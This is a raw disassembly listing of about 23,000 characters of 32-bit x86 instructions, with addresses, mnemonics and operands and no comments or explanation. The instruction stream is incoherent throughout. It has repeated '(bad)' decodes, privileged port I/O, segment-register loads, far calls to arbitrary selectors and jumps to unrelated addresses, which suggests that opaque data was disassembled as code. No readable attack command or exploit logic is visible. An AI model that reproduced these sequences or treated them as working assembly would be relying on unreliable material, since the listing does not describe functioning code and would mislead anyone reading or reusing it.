  422805:	imul   esp,DWORD PTR [ebx-0x1c521fd5],0xffffffbb
  42280c:	cs add al,0xeb
  42280f:	cmp    al,0x96
  422811:	dec    BYTE PTR [eax]
  422813:	push   esp
  422814:	mov    ecx,0xd949a8a
  422819:	cmp    eax,0x8c27bbc3
  42281e:	dec    esi
  42281f:	div    dh
  422821:	gs pop ds
  422823:	add    al,BYTE PTR [eax]
  422825:	add    dl,BYTE PTR [esp+edi*4]
  422828:	mov    cl,0xed
  42282a:	jne    0x422878
  42282c:	jecxz  0x4227f6
  42282e:	push   0xffffffaa
  422830:	cld    
  422831:	pusha  
  422832:	fistp  WORD PTR [esi-0x31c1b694]
  422838:	clc    
  422839:	rcr    ebx,1
  42283b:	push   eax
  42283c:	mov    ecx,0x0
  422841:	add    BYTE PTR [ebx],dl
  422843:	fs out 0xb,eax
  422846:	test   DWORD PTR [ebx-0xce58301],0x6684cfc
  422850:	outs   dx,BYTE PTR ds:[esi]
  422852:	mov    ch,0xdd
  422854:	add    DWORD PTR [eax],eax
  422856:	arpl   WORD PTR [eax],ax
  422858:	add    BYTE PTR [eax],al
  42285a:	test   DWORD PTR [edi+0x75c29412],edx
  422860:	add    dl,BYTE PTR [ecx-0x12]
  422863:	rcl    BYTE PTR [eax+eiz*1],1
  422866:	cld    
  422867:	dec    esi
  422868:	xor    BYTE PTR ds:0xb1b04de6,ah
  42286e:	pop    esi
  42286f:	call   0x6ae56b64
  422874:	jle    0x422860
  422876:	add    dl,BYTE PTR [ebx+0x7d731c4d]
  42287c:	fld    DWORD PTR [edi-0x409c9958]
  422882:	mov    ss,WORD PTR [ebp+0x8]
  422885:	mov    al,ds:0x84c7dae6
  42288a:	mov    edi,0x39d3b67c
  42288f:	xor    esp,DWORD PTR [edi]
  422891:	add    BYTE PTR [esi-0x43],bl
  422894:	test   eax,0xec236553
  422899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42289a:	in     al,dx
  42289b:	div    edi
  42289d:	jae    0x422865
  42289f:	shl    BYTE PTR [esi+0x4b],cl
  4228a2:	iret   
  4228a3:	in     al,0xe5
  4228a5:	aaa    
  4228a6:	out    0x7d,eax
  4228a8:	sbb    al,0x30
  4228aa:	out    0xe7,al
  4228ac:	mov    eax,ds:0xe9016fb4
  4228b1:	scas   al,BYTE PTR es:[edi]
  4228b2:	jae    0x422863
  4228b4:	xchg   ebp,eax
  4228b5:	test   eax,0x1551bc55
  4228ba:	mov    ebx,0xa74e
  4228bf:	add    BYTE PTR [eax],al
  4228c1:	add    BYTE PTR [esi],dh
  4228c3:	add    dl,BYTE PTR [ebp+0xc]
  4228c6:	jne    0x422927
  4228c8:	jg     0x422904
  4228ca:	clc    
  4228cb:	cs aas 
  4228cd:	push   0x5b7f3edd
  4228d2:	sub    al,0xd0
  4228d4:	add    DWORD PTR [eax],eax
  4228d6:	arpl   WORD PTR [eax],ax
  4228d8:	add    BYTE PTR [eax],al
  4228da:	jo     0x4228eb
  4228dc:	jns    0x42286a
  4228de:	mov    ds:0x738c706c,eax
  4228e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228e4:	in     al,0x7e
  4228e6:	rol    bl,cl
  4228e8:	shl    dl,cl
  4228ea:	mov    esi,DWORD PTR [edi]
  4228ec:	scas   eax,DWORD PTR es:[edi]
  4228ed:	mov    esp,0xb80a78f9
  4228f2:	sti    
  4228f3:	loopne 0x422887
  4228f5:	outs   dx,BYTE PTR ds:[esi]
  4228f6:	data16 fdivr DWORD PTR ds:0x4a9a7481
  4228fd:	jb     0x4228bf
  4228ff:	mov    dh,0xb5
  422901:	xor    eax,edi
  422903:	push   0xf7cc423
  422908:	pop    eax
  422909:	jo     0x42295b
  42290b:	out    dx,eax
  42290c:	sbb    eax,0xe2eb5fba
  422911:	jmp    0x5f92feab
  422916:	or     BYTE PTR [eax+0x5e26fb4],dl
  42291c:	fcom   DWORD PTR [ecx-0x21]
  42291f:	(bad)  [ebx]
  422921:	int    0x40
  422923:	pop    esp
  422924:	call   0x56c1:0xaf78731
  42292b:	push   0xffffffbc
  42292d:	and    BYTE PTR [esi],0xc6
  422930:	pushf  
  422931:	mov    ah,0x73
  422933:	pop    ss
  422934:	out    dx,al
  422935:	dec    edi
  422936:	mov    esp,0x4abd8810
  42293b:	mov    cl,0x11
  42293d:	add    BYTE PTR [eax],al
  42293f:	add    BYTE PTR [eax],al
  422941:	add    BYTE PTR [eax],cl
  422943:	mov    cl,0x72
  422945:	cmp    edi,ebx
  422947:	sti    
  422948:	dec    ecx
  422949:	mov    bl,0x94
  42294b:	je     0x422924
  42294d:	call   0xd08f:0x11261293
  422954:	add    DWORD PTR [eax],eax
  422956:	arpl   WORD PTR [eax],ax
  422958:	add    BYTE PTR [eax],al
  42295a:	dec    esp
  42295b:	retf   
  42295c:	or     ecx,DWORD PTR [edx+edi*8]
  42295f:	and    eax,DWORD PTR [esi-0x601b8b18]
  422965:	mov    ebx,0xd226b599
  42296a:	jl     0x422926
  42296c:	leave  
  42296d:	cmp    edi,ebp
  42296f:	xchg   ebp,eax
  422970:	push   ecx
  422971:	inc    edi
  422972:	sub    dl,0xb9
  422975:	inc    esi
  422976:	outs   dx,BYTE PTR ds:[esi]
  422977:	rcr    DWORD PTR [ebx-0x29],1
  42297a:	retf   
  42297b:	sti    
  42297c:	aaa    
  42297d:	sub    dh,BYTE PTR [edx+0x268a9f72]
  422983:	jl     0x422973
  422985:	in     eax,dx
  422986:	mov    ds:0x1a2b314c,al
  42298b:	iret   
  42298c:	cs xchg esi,eax
  42298e:	sub    DWORD PTR [ebp+0x5ced0cc5],0xffffffc0
  422995:	jnp    0x4229f2
  422997:	popa   
  422998:	or     ah,BYTE PTR [ebx+ebp*1]
  42299b:	xchg   ebp,eax
  42299c:	cdq    
  42299d:	sbb    BYTE PTR [ecx+0x7c01315c],0x14
  4229a4:	ds out dx,al
  4229a6:	adc    dh,BYTE PTR [edx+ebx*1-0x1a7c5309]
  4229ad:	(bad)  
  4229ae:	test   DWORD PTR [edi],edi
  4229b0:	push   ebp
  4229b1:	test   al,0x51
  4229b3:	pop    ebx
  4229b4:	fnsave [eax+0x58]
  4229b7:	pusha  
  4229b8:	jmp    0xf9ddd34d
  4229bd:	add    BYTE PTR [eax],al
  4229bf:	add    BYTE PTR [eax],al
  4229c1:	add    bh,bl
  4229c3:	push   ebx
  4229c4:	mov    dl,0x4f
  4229c6:	mov    esi,0x67d3ffef
  4229cb:	xchg   ecx,edi
  4229cd:	adc    al,0x68
  4229cf:	sbb    al,0x41
  4229d2:	repnz rol BYTE PTR [ecx],1
  4229d5:	add    BYTE PTR [ebx+0x0],ah
  4229d8:	add    BYTE PTR [eax],al
  4229da:	adc    cl,ch
  4229dc:	mov    edx,0xe45bf990
  4229e1:	sti    
  4229e2:	push   ebx
  4229e3:	hlt    
  4229e4:	sbb    al,0x10
  4229e6:	std    
  4229e7:	jmp    0x62bbb159
  4229ec:	and    BYTE PTR [eax-0x27f4c80f],bl
  4229f2:	jb     0x422a22
  4229f4:	inc    DWORD PTR [esi+0x35f88b9a]
  4229fa:	xchg   BYTE PTR [edx+edx*4-0x44],dl
  4229fe:	rcl    DWORD PTR [ecx-0x3b789a3f],1
  422a04:	pop    edi
  422a05:	mov    ds:0x8f9f1da7,eax
  422a0a:	test   DWORD PTR [ecx-0x194f6520],edx
  422a10:	mov    edi,0x9ba27924
  422a15:	xchg   esi,eax
  422a16:	cld    
  422a17:	cwde   
  422a18:	fldlg2 
  422a1a:	or     al,bh
  422a1c:	add    DWORD PTR [edi],esp
  422a1e:	(bad)  
  422a1f:	test   DWORD PTR [edi],0xee21a781
  422a25:	pop    ecx
  422a26:	je     0x4229e7
  422a28:	add    ah,BYTE PTR [eax+0xb]
  422a2b:	cmp    eax,0x56261487
  422a30:	loopne 0x4229df
  422a32:	mov    bh,0x6d
  422a34:	retf   
  422a35:	or     cl,dh
  422a37:	sti    
  422a38:	xor    al,0xa0
  422a3a:	imul   edi,DWORD PTR [ecx+edi*2],0x0
  422a41:	add    BYTE PTR [edi-0x24252cf4],al
  422a47:	fisttp WORD PTR [edi+0x640ccb5d]
  422a4d:	push   ss
  422a4e:	inc    ecx
  422a4f:	imul   edx,DWORD PTR [ecx+0x1d15591],0x0
  422a56:	arpl   WORD PTR [eax],ax
  422a58:	add    BYTE PTR [eax],al
  422a5a:	lods   eax,DWORD PTR ds:[esi]
  422a5b:	cmp    bl,BYTE PTR [eax]
  422a5d:	scas   eax,DWORD PTR es:[edi]
  422a5e:	ret    0xd6b7
  422a61:	sbb    BYTE PTR [eax+edx*2-0x54],dl
  422a65:	add    ah,BYTE PTR [eax-0x4cf63c63]
  422a6b:	sbb    bl,bl
  422a6d:	not    DWORD PTR [edx-0x78da1fcf]
  422a73:	mov    ch,bh
  422a75:	fwait
  422a76:	test   eax,0xc4719358
  422a7b:	dec    ecx
  422a7c:	push   edi
  422a7d:	pop    ebx
  422a7e:	pop    edx
  422a7f:	xor    BYTE PTR ds:0x23636f62,ah
  422a85:	jg     0x422acc
  422a87:	cmc    
  422a88:	fwait
  422a89:	dec    edi
  422a8a:	call   0xbadf7d56
  422a8f:	inc    ebx
  422a90:	xor    ebp,esi
  422a92:	sbb    DWORD PTR [esp+ebx*2-0x28dade14],edx
  422a99:	and    DWORD PTR [eax+0x1e],esi
  422a9c:	xor    ebp,DWORD PTR [esi+0x47]
  422a9f:	sti    
  422aa0:	cld    
  422aa1:	lahf   
  422aa2:	xor    eax,0x6b6e7927
  422aa7:	inc    ebp
  422aa8:	pop    ecx
  422aa9:	es in  eax,dx
  422aab:	cli    
  422aac:	loopne 0x422b11
  422aae:	sbb    al,0x44
  422ab0:	pop    ebp
  422ab1:	retf   
  422ab2:	(bad)
  422ab5:	aad    0x33
  422ab7:	cmp    bl,BYTE PTR ds:0x2e492f14
  422abd:	add    BYTE PTR [eax],al
  422abf:	add    BYTE PTR [eax],al
  422ac1:	add    BYTE PTR [edi-0x28db29d],bl
  422ac7:	jle    0x422a88
  422ac9:	out    dx,eax
  422aca:	sbb    edi,esp
  422acc:	mov    BYTE PTR [ecx+edx*1-0x47a6ddeb],dh
  422ad3:	rol    DWORD PTR [ecx],1
  422ad5:	add    BYTE PTR [ebx+0x0],ah
  422ad8:	add    BYTE PTR [eax],al
  422ada:	jae    0x422b51
  422adc:	mov    ds:0x7aaf9f32,eax
  422ae1:	mov    esp,0xb4d1ef22
  422ae6:	test   eax,0xf418ad06
  422aeb:	lock cdq 
  422aed:	xchg   DWORD PTR [ecx],ebp
  422aef:	sahf   
  422af0:	add    edi,DWORD PTR [ebx+ecx*2-0x42d34a5c]
  422af7:	adc    esi,esi
  422af9:	mov    WORD PTR [edx-0x423cd46e],fs
  422aff:	cmp    BYTE PTR [ebx],dl
  422b01:	fstp   QWORD PTR [ecx+0x1db31c63]
  422b07:	aas    
  422b08:	imul   edi,DWORD PTR [esi-0x58],0x68e1f0bf
  422b0f:	lock sub ah,BYTE PTR [eax]
  422b12:	sub    esi,DWORD PTR [ebx+0x21]
  422b15:	sbb    edi,DWORD PTR [edi]
  422b17:	idiv   BYTE PTR [edi+edx*8]
  422b1a:	mov    cl,0xc4
  422b1c:	dec    esi
  422b1d:	jne    0x422b13
  422b1f:	test   al,0x99
  422b21:	jle    0x422b89
  422b23:	mov    ds:0x38f908d2,al
  422b28:	push   DWORD PTR ds:0xd0d7
  422b2d:	cs pusha 
  422b2f:	scas   eax,DWORD PTR es:[edi]
  422b30:	call   ebx
  422b32:	mov    esp,0xf7e95451
  422b37:	and    eax,0x7cb8a353
  422b3c:	push   ebp
  422b3d:	add    BYTE PTR [eax],al
  422b3f:	add    BYTE PTR [eax],al
  422b41:	add    BYTE PTR [eax+0x23],dh
  422b44:	and    eax,0x7c6f7769
  422b49:	cmp    esp,DWORD PTR [eax-0x7f4311e4]
  422b4f:	jo     0x422bbd
  422b51:	stc    
  422b52:	sbb    edx,edx
  422b54:	add    DWORD PTR [eax],eax
  422b56:	arpl   WORD PTR [eax],ax
  422b58:	add    BYTE PTR [eax],al
  422b5a:	jbe    0x422b98
  422b5c:	sbb    DWORD PTR ds:0x625ba5c2,0xedddaf55
  422b66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b67:	cmc    
  422b68:	xor    al,0xd9
  422b6a:	test   BYTE PTR [ebx],al
  422b6c:	scas   eax,DWORD PTR es:[edi]
  422b6d:	push   es
  422b6e:	(bad)  
  422b6f:	cld    
  422b70:	ins    BYTE PTR es:[edi],dx
  422b71:	ins    BYTE PTR es:[edi],dx
  422b72:	fisttp WORD PTR [eax+eax*1+0x3c6654ac]
  422b79:	not    DWORD PTR [eax]
  422b7b:	pop    edi
  422b7c:	(bad)  
  422b7d:	iret   
  422b7e:	aaa    
  422b7f:	jl     0x422b5d
  422b81:	leave  
  422b82:	in     al,0x71
  422b84:	call   0x5361:0xa05ee0b2
  422b8b:	bound  esi,QWORD PTR [edi-0x50b67c07]
  422b91:	dec    ebp
  422b92:	or     BYTE PTR [eax-0x3],cl
  422b95:	pop    edi
  422b96:	syscall 
  422b98:	fisub  WORD PTR [edi+0x7b]
  422b9b:	lods   al,BYTE PTR ds:[esi]
  422b9c:	mov    dl,0x6f
  422b9e:	jbe    0x422b80
  422ba0:	in     eax,0x74
  422ba2:	jmp    0xf4955fe8
  422ba7:	in     al,dx
  422ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ba9:	fwait
  422baa:	imul   eax,edi,0x4b
  422bad:	cs sub eax,0x91a64ed6
  422bb3:	imul   BYTE PTR [eax-0x7ae294e]
  422bb9:	adc    BYTE PTR [ebp-0x18],bh
  422bbc:	add    BYTE PTR [eax],0x0
  422bbf:	add    BYTE PTR [eax],al
  422bc1:	add    BYTE PTR [eax+edx*4-0x32223f23],dl
  422bc8:	popf   
  422bc9:	aam    0x57
  422bcb:	(bad)
  422bcf:	daa    
  422bd0:	loopne 0x422b94
  422bd2:	jle    0x422ba6
  422bd4:	add    DWORD PTR [eax],eax
  422bd6:	arpl   WORD PTR [eax],ax
  422bd8:	add    BYTE PTR [eax],al
  422bda:	aas    
  422bdb:	mov    ebp,0x25e6039e
  422be0:	cmp    dl,0x93
  422be3:	jnp    0x422b8b
  422be5:	jne    0x422c52
  422be7:	add    BYTE PTR [eax+0x2ff7fb00],al
  422bed:	push   esi
  422bee:	test   eax,0x311b3a5c
  422bf3:	fisttp DWORD PTR [esi-0x71]
  422bf6:	mov    ecx,0x7f458143
  422bfb:	sub    eax,DWORD PTR [edx+0xf]
  422bfe:	popa   
  422bff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c00:	bound  esp,QWORD PTR ds:[ebp-0x76]
  422c04:	pop    ss
  422c05:	pop    ebp
  422c06:	mov    dl,BYTE PTR [ebp+0x9eea971]
  422c0c:	stc    
  422c0d:	rol    DWORD PTR [edi],cl
  422c0f:	out    dx,eax
  422c10:	xchg   edx,eax
  422c11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c12:	data16 fst QWORD PTR ss:[ebx+0x5b694113]
  422c1b:	xlat   BYTE PTR ds:[ebx]
  422c1c:	xchg   ecx,eax
  422c1d:	and    al,0x9b
  422c1f:	xor    esp,eax
  422c21:	jne    0x422bba
  422c23:	mov    ecx,0x92abd4ae
  422c28:	sub    DWORD PTR [eax-0x56],edi
  422c2b:	xchg   edi,eax
  422c2c:	pop    edi
  422c2d:	(bad)  
  422c2e:	push   ecx
  422c2f:	xchg   edx,eax
  422c30:	and    al,0xb3
  422c32:	xchg   ebp,eax
  422c33:	jb     0x422be3
  422c35:	mov    esi,0x859d02d9
  422c3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c3b:	(bad)  
  422c3d:	add    BYTE PTR [eax],al
  422c3f:	add    BYTE PTR [eax],al
  422c41:	add    ah,dh
  422c43:	mov    dl,0x32
  422c45:	(bad)  
  422c46:	jbe    0x422c1e
  422c48:	hlt    
  422c49:	mov    dl,0xb1
  422c4b:	and    al,0xfe
  422c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c4e:	ror    WORD PTR [edx+0x1d2e1ba],0x0
  422c56:	arpl   WORD PTR [eax],ax
  422c58:	add    BYTE PTR [eax],al
  422c5a:	stc    
  422c5b:	(bad)  
  422c5c:	and    al,0x73
  422c5e:	aad    0xfe
  422c60:	mov    al,0x6f
  422c62:	ja     0x422c9e
  422c64:	mov    cl,0x0
  422c66:	repnz adc eax,0x1bbc9a51
  422c6c:	std    
  422c6d:	mov    al,0x95
  422c6f:	and    DWORD PTR [ecx+edx*8],esi
  422c72:	pushf  
  422c73:	loop   0x422cc8
  422c75:	or     al,0xeb
  422c77:	int3   
  422c78:	in     eax,dx
  422c79:	jb     0x422ce6
  422c7b:	repz mov ds,eax
  422c7e:	add    DWORD PTR [ecx],ebx
  422c80:	and    esi,DWORD PTR [eax]
  422c82:	ja     0x422cf3
  422c84:	scas   al,BYTE PTR es:[edi]
  422c85:	and    edi,DWORD PTR [edx]
  422c87:	mul    BYTE PTR [ecx-0xbaba8d3]
  422c8d:	outs   dx,DWORD PTR ds:[esi]
  422c8e:	pop    eax
  422c8f:	call   0x27e7:0x58f16886
  422c96:	dec    ebx
  422c97:	cli    
  422c98:	sub    edi,edi
  422c9a:	sbb    BYTE PTR [eax+edx*8-0x18e2b9e],ah
  422ca1:	out    0x2,eax
  422ca3:	lods   al,BYTE PTR ds:[esi]
  422ca4:	data16 jne 0x422ccb
  422ca7:	push   eax
  422ca8:	sbb    DWORD PTR [edi+0x13],esi
  422cab:	ffree  st(3)
  422cad:	pop    ecx
  422cae:	and    edx,DWORD PTR [esi-0x88e3a58]
  422cb4:	sti    
  422cb5:	sbb    DWORD PTR [eax],eax
  422cb7:	mov    eax,ds:0x3f8eb0ab
  422cbc:	ret    
  422cbd:	add    BYTE PTR [eax],al
  422cbf:	add    BYTE PTR [eax],al
  422cc1:	add    BYTE PTR [edx],dh
  422cc3:	ror    esi,cl
  422cc5:	mov    ds:0xd37ebfef,al
  422cca:	sub    edi,DWORD PTR [esi]
  422ccc:	out    0x3f,eax
  422cce:	add    DWORD PTR [ebx],edx
  422cd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cd1:	or     eax,0x1d344
  422cd6:	arpl   WORD PTR [eax],ax
  422cd8:	add    BYTE PTR [eax],al
  422cda:	aam    0x3c
  422cdc:	cmc    
  422cdd:	pop    ebx
  422cde:	or     BYTE PTR [edx-0xf46043d],cl
  422ce4:	(bad)  
  422ce5:	rcl    DWORD PTR ds:0x9d247470,cl
  422ceb:	lock fisub DWORD PTR [ebx+0x5e]
  422cef:	adc    esi,DWORD PTR [edx+ebp*4-0x194e52c7]
  422cf6:	xchg   BYTE PTR [eax],dl
  422cf8:	loop   0x422d0f
  422cfa:	inc    edi
  422cfb:	fcom   DWORD PTR [ebp+0xc30122]
  422d01:	inc    esp
  422d02:	jl     0x422cde
  422d04:	(bad)  
  422d05:	pop    esp
  422d06:	popa   
  422d07:	in     al,0x5d
  422d09:	cmp    ch,cl
  422d0b:	cs xor ah,ch
  422d0e:	fdivr  st(0),st
  422d10:	shr    BYTE PTR [edi+0x61524642],1
  422d16:	in     al,dx
  422d17:	push   ebp
  422d18:	push   ss
  422d19:	imul   eax,DWORD PTR [eax],0x6d
  422d1c:	sub    esp,ebp
  422d1e:	add    ecx,DWORD PTR [ecx-0x8]
  422d21:	jb     0x422d04
  422d23:	lods   al,BYTE PTR ds:[esi]
  422d24:	pop    ecx
  422d25:	jmp    0x422cc6
  422d27:	aaa    
  422d28:	mov    BYTE PTR [edx+ecx*4-0x4bfa062a],al
  422d2f:	fcomp  DWORD PTR [eax+ebx*1-0x57836d20]
  422d36:	sbb    eax,0xfb52803e
  422d3b:	jae    0x422d34
  422d3d:	add    BYTE PTR [eax],al
  422d3f:	add    BYTE PTR [eax],al
  422d41:	add    bl,bl
  422d43:	in     eax,dx
  422d44:	outs   dx,BYTE PTR ds:[esi]
  422d45:	and    bh,BYTE PTR [esi-0x5d]
  422d48:	(bad)  
  422d4a:	pop    esi
  422d4b:	(bad)  
  422d4c:	mov    DWORD PTR [ebp-0x163286a5],ecx
  422d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d53:	rol    DWORD PTR [ecx],cl
  422d55:	add    BYTE PTR [ebx+0x0],ah
  422d58:	add    BYTE PTR [eax],al
  422d5a:	fsub   st,st(6)
  422d5c:	in     al,0x78
  422d5e:	pop    es
  422d5f:	push   esp
  422d60:	arpl   WORD PTR [ecx+0x25],bp
  422d63:	ss cmp eax,0x6e07bcb0
  422d69:	dec    edi
  422d6a:	inc    edi
  422d6b:	mov    BYTE PTR [ebx-0x52],dl
  422d6e:	leave  
  422d6f:	add    dh,al
  422d71:	cwde   
  422d72:	xchg   eax,eax
  422d74:	loopne 0x422d4f
  422d76:	pop    ss
  422d77:	or     eax,0x1f9d76c2
  422d7c:	mov    bl,BYTE PTR [edx+0x5165c5b]
  422d82:	rcr    DWORD PTR [ebp+eiz*8-0x34c7c3e7],1
  422d89:	cmp    ebp,0x159c66f5
  422d8f:	mov    al,0x28
  422d91:	fucomp st(6)
  422d93:	(bad)  
  422d94:	call   0x6524:0xb6b3faa
  422d9b:	xor    eax,0xbb91b202
  422da0:	mov    esp,0x6bbe612d
  422da5:	lods   al,BYTE PTR ds:[esi]
  422da6:	fiadd  DWORD PTR [ecx+0x62ede10]
  422dac:	cmp    ch,ah
  422dae:	push   edx
  422daf:	loop   0x422e10
  422db1:	xor    eax,0xe7102a6b
  422db6:	jmp    0x422e2e
  422db8:	rol    bl,0x17
  422dbb:	out    0x40,eax
  422dbd:	add    BYTE PTR [eax],al
  422dbf:	add    BYTE PTR [eax],al
  422dc1:	add    BYTE PTR ds:0x6f976b22,al
  422dc7:	(bad)  
  422dc9:	mov    dl,0x66
  422dcb:	and    BYTE PTR [esi-0x2b73f096],ah
  422dd1:	leave  
  422dd2:	or     dl,ah
  422dd4:	add    DWORD PTR [eax],eax
  422dd6:	arpl   WORD PTR [eax],ax
  422dd8:	add    BYTE PTR [eax],al
  422dda:	cld    
  422ddb:	mov    bh,0x66
  422ddd:	pop    esi
  422dde:	inc    ebp
  422ddf:	jns    0x422d87
  422de1:	ins    BYTE PTR es:[edi],dx
  422de2:	sub    eax,0x6d01a5ce
  422de7:	xor    al,0x13
  422de9:	hlt    
  422dea:	les    esi,FWORD PTR [edi-0xb4161d4]
  422df0:	neg    eax
  422df2:	call   0x3a4c:0x5d8f0a60
  422df9:	je     0x422d8b
  422dfb:	or     dh,0x65
  422dfe:	test   ax,0x7ed4
  422e02:	xlat   BYTE PTR ds:[ebx]
  422e03:	ss push 0xec503182
  422e09:	into   
  422e0a:	shl    BYTE PTR [esi-0xe889b6e],cl
  422e10:	icebp  
  422e11:	hlt    
  422e12:	sub    al,0x1c
  422e14:	sbb    al,0xb
  422e16:	mov    eax,0xa8e49033
  422e1b:	jecxz  0x422dd9
  422e1d:	call   0x7fc27c08
  422e22:	lods   eax,DWORD PTR ds:[esi]
  422e23:	cmp    ebp,DWORD PTR cs:[ebp-0xfa43eb2]
  422e2a:	in     eax,0xd1
  422e2c:	in     al,dx
  422e2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e2e:	js     0x422e96
  422e30:	pusha  
  422e31:	sti    
  422e32:	jle    0x422ddf
  422e34:	cmp    BYTE PTR [edx],ah
  422e36:	dec    DWORD PTR ds:0xd6ab80ff
  422e3c:	adc    DWORD PTR [eax],eax
  422e3e:	add    BYTE PTR [eax],al
  422e40:	add    BYTE PTR [eax],al
  422e42:	mov    edx,esp
  422e44:	and    al,0xd9
  422e46:	jg     0x422e41
  422e48:	call   esi
  422e4a:	into   
  422e4b:	inc    ebp
  422e4c:	mov    bh,0x11
  422e4e:	std    
  422e4f:	push   ss
  422e50:	sub    eax,0x1d46da2
  422e55:	add    BYTE PTR [ebx+0x0],ah
  422e58:	add    BYTE PTR [eax],al
  422e5a:	fnstcw WORD PTR [esi]
  422e5c:	cmp    BYTE PTR [edi-0x1fdb9c44],ch
  422e62:	mov    ah,0x39
  422e64:	test   eax,0x47145da3
  422e69:	lea    ebx,[ebx+0x1]
  422e6c:	xchg   BYTE PTR [ebx+edx*2+0x6e],bl
  422e70:	dec    esp
  422e71:	push   eax
  422e72:	rcr    BYTE PTR ds:0xcc482965,cl
  422e78:	or     eax,0x8b402945
  422e7d:	std    
  422e7e:	ins    DWORD PTR es:[edi],dx
  422e7f:	sbb    DWORD PTR [ebp+0x72],ecx
  422e82:	xchg   esp,eax
  422e83:	lea    esi,[esi]
  422e85:	nop
  422e86:	stos   DWORD PTR es:[edi],eax
  422e87:	push   ds
  422e88:	jo     0x422ef0
  422e8a:	and    bl,bl
  422e8c:	xor    eax,0x1b3ddad7
  422e91:	sub    edx,DWORD PTR [ebx]
  422e93:	inc    edx
  422e94:	out    dx,eax
  422e95:	push   edi
  422e96:	push   edi
  422e97:	mov    ebx,0xba7e6876
  422e9c:	xor    cl,BYTE PTR [eax]
  422e9e:	dec    eax
  422e9f:	aaa    
  422ea0:	jno    0x422eac
  422ea2:	test   eax,0x79a194f7
  422ea7:	xchg   esp,eax
  422ea8:	adc    dl,BYTE PTR [edi+ebx*1]
  422eab:	dec    eax
  422eac:	push   esi
  422ead:	pop    ebx
  422eae:	adc    bh,BYTE PTR [ebp-0x5ed884ec]
  422eb4:	out    0xce,al
  422eb6:	adc    eax,0x120973e
  422ebb:	je     0x422f1b
  422ebd:	add    BYTE PTR [eax],al
  422ebf:	add    BYTE PTR [eax],al
  422ec1:	add    dh,bl
  422ec3:	sub    DWORD PTR [eax-0x210c002e],ebx
  422ec9:	sub    eax,0x4af35f6
  422ece:	inc    edx
  422ecf:	int3   
  422ed0:	jb     0x422ee5
  422ed2:	rcl    ah,1
  422ed4:	add    DWORD PTR [eax],eax
  422ed6:	arpl   WORD PTR [eax],ax
  422ed8:	add    BYTE PTR [eax],al
  422eda:	mov    al,0xd5
  422edc:	dec    ebx
  422edd:	dec    ebp
  422ede:	fdivr  QWORD PTR [ebx]
  422ee0:	xor    al,0x51
  422ee2:	adc    ebp,ecx
  422ee4:	mov    esp,0x681ea6cb
  422ee9:	jp     0x422f38
  422eeb:	dec    edx
  422eec:	popf   
  422eed:	outs   dx,DWORD PTR ds:[esi]
  422eee:	je     0x422f5d
  422ef0:	cmp    BYTE PTR ds:0xd84dff8d,dh
  422ef6:	retf   
  422ef7:	not    BYTE PTR [ecx+0x17]
  422efa:	sbb    al,0xcf
  422efc:	(bad)  
  422efd:	xchg   ebp,eax
  422efe:	add    eax,0x2f0c2f5e
  422f03:	jnp    0x422f43
  422f05:	add    ah,BYTE PTR [ebp+0x29e83269]
  422f0b:	daa    
  422f0c:	sub    esi,edi
  422f0e:	pop    ecx
  422f0f:	cs push 0xffffff9f
  422f12:	inc    eax
  422f13:	imul   ebx,ebx,0xffffff9b
  422f16:	sbb    dh,ah
  422f18:	jnp    0x422f90
  422f1a:	shl    bh,1
  422f1c:	(bad)  [esi-0x27]
  422f1f:	jae    0x422f53
  422f21:	pop    ecx
  422f22:	and    BYTE PTR [eax],bh
  422f24:	jo     0x422f6b
  422f26:	dec    ebp
  422f27:	inc    eax
  422f28:	sub    ebx,DWORD PTR [eax+0x40]
  422f2b:	imul   edi,DWORD PTR [esi-0x15],0x70
  422f2f:	sti    
  422f30:	inc    eax
  422f31:	jecxz  0x422f67
  422f33:	aam    0x55
  422f35:	daa    
  422f36:	lea    ebx,[ebx]
  422f38:	jl     0x422ecb
  422f3a:	shl    BYTE PTR [eax+0x65],1
  422f3d:	add    BYTE PTR [eax],al
  422f3f:	add    BYTE PTR [eax],al
  422f41:	add    BYTE PTR [esi+0x3f],cl
  422f44:	int3   
  422f45:	sbb    eax,0x7fdffffd
  422f4a:	out    dx,eax
  422f4b:	loopne 0x422f63
  422f4d:	lods   al,BYTE PTR ds:[esi]
  422f4e:	inc    esp
  422f4f:	sub    al,0x8b
  422f51:	cld    
  422f52:	xor    edx,ebp
  422f54:	add    DWORD PTR [eax],eax
  422f56:	arpl   WORD PTR [eax],ax
  422f58:	add    BYTE PTR [eax],al
  422f5a:	pop    ebp
  422f5b:	pextrw ebp,(bad),0xc5
  422f5d:	sub    ebp,edi
  422f5f:	add    al,0x3f
  422f61:	dec    ebx
  422f62:	fmulp  st(4),st
  422f64:	je     0x422fd3
  422f66:	adc    DWORD PTR [edi],edi
  422f68:	push   ebx
  422f69:	iret   
  422f6a:	pop    es
  422f6b:	xchg   edi,eax
  422f6c:	stos   DWORD PTR es:[edi],eax
  422f6d:	mov    bh,0xa0
  422f6f:	cs pop esp
  422f71:	adc    DWORD PTR [esi],edx
  422f73:	adc    al,0x4f
  422f75:	retf   0x846a
  422f78:	xchg   BYTE PTR [edx-0x6b33aa7f],cl
  422f7e:	(bad)  
  422f7f:	mov    al,ds:0xf9bd2461
  422f84:	fwait
  422f85:	jl     0x422f2d
  422f87:	ds scas al,BYTE PTR es:[edi]
  422f89:	mov    ch,0x12
  422f8b:	pushf  
  422f8c:	in     eax,dx
  422f8d:	inc    ebx
  422f8e:	adc    al,0xba
  422f90:	fadd   st(2),st
  422f92:	ss test eax,0xeb553cc3
  422f98:	mov    BYTE PTR [edx+0x6a],al
  422f9b:	add    eax,0x3ef2b337
  422fa0:	sbb    eax,0x22d47fb
  422fa5:	cdq    
  422fa6:	pop    ecx
  422fa7:	sbb    al,0xe9
  422fa9:	push   esp
  422faa:	or     DWORD PTR [eax-0xc],0xffffffad
  422fae:	or     esp,DWORD PTR [esi+0x2b970f3d]
